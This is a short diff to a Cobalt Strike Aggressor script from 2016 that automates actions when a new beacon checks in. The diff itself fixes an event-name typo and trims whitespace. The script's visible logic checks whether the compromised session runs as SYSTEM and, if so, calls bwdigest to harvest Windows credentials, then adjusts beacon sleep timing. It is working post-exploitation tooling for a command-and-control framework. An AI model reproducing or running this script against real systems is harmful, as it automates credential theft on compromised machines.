@@ -1,11 +1,11 @@
 #################################################
-# Created by @jgaudard  :: I don't twitter much 
+# Created by @jgaudard  :: I don't twitter much
 # Aggressor script for initial_beacon with cobaltstrike
 # Created: 29 Sept 2016
 # Version 1.0
 #################################################
 
-on becaon_initial {
+on beacon_initial {
   if("SYSTEM" isin beacon_info($1, "user")) {
     say("user is system");
     bwdigest($1);
@@ -24,10 +24,3 @@ on becaon_initial {
     bsleep($1, 300, 30);
   }
 }
-
-
-
-
-
-
-
